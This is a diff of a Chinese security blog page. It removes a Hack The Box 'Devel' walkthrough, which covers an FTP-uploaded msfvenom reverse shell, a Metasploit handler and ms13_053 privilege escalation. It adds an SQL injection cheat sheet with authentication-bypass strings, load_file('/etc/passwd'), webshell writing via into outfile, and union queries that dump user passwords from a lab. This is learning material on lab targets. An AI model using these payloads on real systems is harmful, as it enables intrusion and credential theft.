@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="DevelAuthor:Xingg在HTB中Devel算是入门级的简单机器，但是平时Linux的机器做得比较多windows的机器基本没接触过，做一下Devel也算是练习一下windows机器。FTP上传webshell，msf提权">
+<meta name="description" content="SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Devel">
-<meta property="og:url" content="http://yoursite.com/2020/03/18/HTB_Devel/index.html">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://yoursite.com/2020/03/20/SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Xingg&#39;s Blog">
-<meta property="og:description" content="DevelAuthor:Xingg在HTB中Devel算是入门级的简单机器，但是平时Linux的机器做得比较多windows的机器基本没接触过，做一下Devel也算是练习一下windows机器。FTP上传webshell，msf提权">
+<meta property="og:description" content="SQL注入">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-03-17T16:24:19.000Z">
-<meta property="article:modified_time" content="2020-03-18T03:43:48.094Z">
+<meta property="article:published_time" content="2020-03-19T17:47:29.000Z">
+<meta property="article:modified_time" content="2020-03-19T16:34:55.099Z">
 <meta property="article:author" content="Xingg">
 <meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="HTB">
@@ -124,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/18/HTB_Devel/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/20/SQL注入/"/>
 
 
 
 
 
-  <title>Devel | Xingg's Blog</title>
+  <title>SQL注入 | Xingg's Blog</title>
   
 
 
@@ -247,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/18/HTB_Devel/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/20/SQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Xingg">
@@ -264,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Devel</h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入</h1>
         
 
         <div class="post-meta">
@@ -276,8 +276,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-18T00:24:19+08:00">
-                2020-03-18
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-20T01:47:29+08:00">
+                2020-03-20
               </time>
             
 
@@ -299,8 +299,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA-HTB/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机-HTB</span>
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -336,20 +336,67 @@
       
 
       
-        <h1 id="Devel"><a href="#Devel" class="headerlink" title="Devel"></a>Devel</h1><p><strong>Author:Xingg</strong><br>在HTB中Devel算是入门级的简单机器，但是平时Linux的机器做得比较多windows的机器基本没接触过，做一下Devel也算是练习一下windows机器。<br>FTP上传webshell，msf提权</p>
+        <p>SQL注入</p>
 <a id="more"></a>
 
-<p>在这个靶机中，传马的方式是FTP匿名登录，上传了一个webshell，在实际环境中，上传webshell的方法多种多样，但是后面提权的手段以及msf的操作可以借鉴</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -T4 10.10.10.5  </span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234521293.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">从nmap可以看到允许Anonymous用户登录ftp 密码随意  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234536598.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">可以连上ftp</span><br><span class="line"></span><br><span class="line">然后在80端口就这样一个网页</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234552740.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">右击查看源码，发现了FTP文件里的同名图片</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234609554.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)   </span><br><span class="line">ftp和IIS在服务器应该在同一个目录 访问10.10.10.5&#x2F;welcome.png验证一下</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234623351.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)   </span><br><span class="line">果然，那我们就可以使用ftp上传一个webshell到iis目录下</span><br><span class="line">此处使用的是msf生成的反弹shell</span><br><span class="line">使用msfvenom生成shell  –h查看帮助</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234637186.png)    </span><br><span class="line">其中 -p -f -o 是需要的 还需另外输入LHOST和LPORT</span><br><span class="line">&#96;--list format&#96;查看所有shell的形式</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234648901.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line">在这个服务器上是iis7.5 用的应该是aspx</span><br><span class="line">--list payload 查看所有的payload</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234702244.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line">因为不确定是32位还是64位机器，所有payload里windows&#x2F;meterpreter&#x2F;reverse_tcp比较通用</span><br><span class="line">然后生成shell</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234715991.png)</span><br><span class="line">ftp上传</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020012223472438.png)</span><br></pre></td></tr></table></figure>
-<p>开启msfconsole<br>use expoit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost x.x.x.x</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234740658.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line">run 然后去浏览器访问这个网页</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234922138.png)</span><br><span class="line">切回来shell已经弹回来了</span><br><span class="line">（在meterpreter下敲background可以挂起这个session）</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020012223493958.png)</span><br><span class="line">shell查看systeminfo</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122234951741.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line">查看到这是一台win7，hotfix是 N&#x2F;A 表示这台机器从来没有打过补丁，应该有很多漏洞</span><br><span class="line">我们利用一个信息收集脚本</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122235008211.png)</span><br><span class="line">只需要把刚才的session填进去就好了</span><br><span class="line">set session 1</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122235133189.png)</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200122235139940.png)</span><br><span class="line">经过测试这个提权脚本是可以用的</span><br></pre></td></tr></table></figure>
-<p>use windows/local/ms13_053_schlamperei<br>set session<br>run</p>
-<pre><code>`ctrl+c`
-然后在重新设置一下lhost和一个新的lport
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200122235218272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)
-run
-然后就成功拿到了system权限(我的截图怎么少了最后一张 自闭)
-</code></pre>
+
+<h1 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h1><h2 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1. 数字型"></a>1. 数字型</h2><pre><code>验证SQL注入漏洞存在
+猜测语句为select * from table where id =8
+select * from table where id =8‘ 无法执行
+select * from table where id =8 and 1=1 数据请求成功
+select * from table where id =8 and 1=2 数据请求失败
+以上全部满足 则存在sql注入漏洞</code></pre><h2 id="2-字符型"><a href="#2-字符型" class="headerlink" title="2. 字符型"></a>2. 字符型</h2><pre><code>select * from table where username=’admin‘ and password=’123‘
+注入 ’ or1=1 #
+&apos; or 1=1 –</code></pre><h2 id="3-报错型"><a href="#3-报错型" class="headerlink" title="3. 报错型"></a>3. 报错型</h2><pre><code>输入特殊字符，如果报错，则存在注入点
+select * from table where id =8‘
+常用的特殊字符：’ \ ; %00 ) ( # &quot;</code></pre><h2 id="4-盲注"><a href="#4-盲注" class="headerlink" title="4. 盲注"></a>4. 盲注</h2><pre><code>无法通过页面直接返回数据
+    a. 布尔型
+    后台有正确和错误两种页面，根绝返回的页面判断是否注入成功
+    b. 无回显型
+    正常查询有结果，注入为true有结果，注入为false没结果
+    c. 时间型
+    用sleep函数判断查询的true和false</code></pre><h2 id="5-堆叠"><a href="#5-堆叠" class="headerlink" title="5. 堆叠"></a>5. 堆叠</h2><pre><code>分号隔开执行多个sql语句</code></pre><h2 id="6-联合查询union"><a href="#6-联合查询union" class="headerlink" title="6. 联合查询union"></a>6. 联合查询union</h2><pre><code>前后查询的参数数量要一样，可以用order by确定，也可以直接union select 1,1,1,1 
+但是注意，这样不会总是成功，严格限制过的数据类型为string的话，数字1不会输出
+所以最好用NULL，union select NULL,NULL,NULL </code></pre><h2 id="7-二次注入"><a href="#7-二次注入" class="headerlink" title="7. 二次注入"></a>7. 二次注入</h2><pre><code>写入数据库的时候严格转义，存进了数据库，数据库读数据的时候，造成的注入</code></pre><h2 id="8-宽字节注入"><a href="#8-宽字节注入" class="headerlink" title="8. 宽字节注入"></a>8. 宽字节注入</h2><pre><code>在输入单引号&apos;时，数据库会加上反斜杠\来转义，在gbk编码里用两个字节表示一个汉字，可以利用这个特性使\不生效，注入时输入%df&apos; 在后台变成%df%5c&apos; 其中%df%5c变成一个汉字，单引号生效，又存在注入点了
+防范：
+将character_set_client设置成binary，数据以二进制传递</code></pre><h2 id="9-HTTP其他内容注入"><a href="#9-HTTP其他内容注入" class="headerlink" title="9. HTTP其他内容注入"></a>9. HTTP其他内容注入</h2><pre><code>除了在get post内容中存在注入，其他存在数据库读写的地方，也可能存在注入，比如cookie x-forward-for</code></pre><h1 id="SQL注入常用利用手段"><a href="#SQL注入常用利用手段" class="headerlink" title="SQL注入常用利用手段"></a>SQL注入常用利用手段</h1><h2 id="1-select-load-file-‘-etc-passwd’-读文件"><a href="#1-select-load-file-‘-etc-passwd’-读文件" class="headerlink" title="1. select load_file(‘/etc/passwd’) 读文件"></a>1. select load_file(‘/etc/passwd’) 读文件</h2><pre><code>.bash_histoty</code></pre><h2 id="2-seletc-‘xxx’-into-outfile-‘shell-php’-写文件"><a href="#2-seletc-‘xxx’-into-outfile-‘shell-php’-写文件" class="headerlink" title="2. seletc ‘xxx’ into outfile ‘shell.php’ 写文件"></a>2. seletc ‘xxx’ into outfile ‘shell.php’ 写文件</h2><pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; into outfile &apos;C:\Windows\tmp\8.php&apos; 
+数据库用户要有写权限，知道绝对路径
+linux下的默认路径 /var/www/html </code></pre><h2 id="3-联合查询爆库"><a href="#3-联合查询爆库" class="headerlink" title="3. 联合查询爆库"></a>3. 联合查询爆库</h2><pre><code>mysql数据库里有个系统库 information_schema
+库里有三个重要的表：schemata  tables  columns
+schemata : schema_name
+tables: table_schema, table_name
+columns: table_name,column_name
+
+    a. 爆破库
+    id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata-- +
+    发现目标库security
+    b. 爆破表
+    id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+
+    发现目标security库下的users表 
+    c. 爆破字段
+    id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;-- 
+    发现目标security库下的users表 下存在usrname,password字段
+    d. 查询字段 http://192.168.31.165/sqlilab/Less-1/?id=-1&apos; union select 1,group_concat(username),3 from security.users-- 
+    http://192.168.31.165/sqlilab/Less-1/?id=-1&apos; union select 1,group_concat(password),3 from security.users-- 
+
+    e. 注意在where限制查询条件的时候一定要加引号&apos;，
+    f. 如果被限制了每次只能返回一条记录，就用group_concat(password)查询，把多个结果当做一条记录输出到页面，也可以用limit 0,1只输出一条
+    g. 如果每次可以显示两个字段，每次不限制记录条数，只用查询3次，
+    库+表 select table_schema,table_name from information_schema.tables
+    表+字段 select table_name,column_name from information_schema.columns
+    字段 select user,password from dvwa.users;</code></pre><h2 id="4-盲注爆库"><a href="#4-盲注爆库" class="headerlink" title="4. 盲注爆库"></a>4. 盲注爆库</h2><pre><code>常用函数
+length()
+left(a,b) 取a的前b个字母
+substring(string, start, length)
+mid(string, start, length)
+substr(string, start, length) 截取字符串 substr(a,b,c)从第b个开始取c个字符
+ascii() ord()返回第一个字符的ascii值
+
+substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&apos;i&apos;
+length((select schema_name from information_schema.schemata limit 0,1)=18
+其中(select schema_name from information_schema.schemata limit 0,1)的limit 0,1表示查询的结果中，从第0行开始，获取1个
+这样就能爆出所有的库，表，字段
+使用bp的爆破模块 设key为末尾&apos;i&apos;，事情变得简单了起来</code></pre>
       
     </div>
     
@@ -373,8 +420,8 @@ run
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/18/Redis%E7%BB%83%E4%B9%A0%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF%E5%88%B0HTB%E5%AE%9E%E6%88%98postman_userflag/" rel="next" title="Redis练习到HTB-Postman实战">
-                <i class="fa fa-chevron-left"></i> Redis练习到HTB-Postman实战
+              <a href="/2020/03/19/msf%E5%8F%8D%E5%BC%B9shell/" rel="next" title="msf反弹shell">
+                <i class="fa fa-chevron-left"></i> msf反弹shell
               </a>
             
           </div>
@@ -382,10 +429,6 @@ run
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/19/nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%BC%8F/" rel="prev" title="nmap扫描端口常用的几种扫描模式">
-                nmap扫描端口常用的几种扫描模式 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -508,7 +551,7 @@ run
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Devel"><span class="nav-text">Devel</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入分类"><span class="nav-text">SQL注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-数字型"><span class="nav-text">1. 数字型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-字符型"><span class="nav-text">2. 字符型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-报错型"><span class="nav-text">3. 报错型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-盲注"><span class="nav-text">4. 盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-堆叠"><span class="nav-text">5. 堆叠</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-联合查询union"><span class="nav-text">6. 联合查询union</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-二次注入"><span class="nav-text">7. 二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-宽字节注入"><span class="nav-text">8. 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-HTTP其他内容注入"><span class="nav-text">9. HTTP其他内容注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入常用利用手段"><span class="nav-text">SQL注入常用利用手段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-select-load-file-‘-etc-passwd’-读文件"><span class="nav-text">1. select load_file(‘&#x2F;etc&#x2F;passwd’) 读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-seletc-‘xxx’-into-outfile-‘shell-php’-写文件"><span class="nav-text">2. seletc ‘xxx’ into outfile ‘shell.php’ 写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-联合查询爆库"><span class="nav-text">3. 联合查询爆库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-盲注爆库"><span class="nav-text">4. 盲注爆库</span></a></li></ol></li></ol></div>
             
 
           </div>
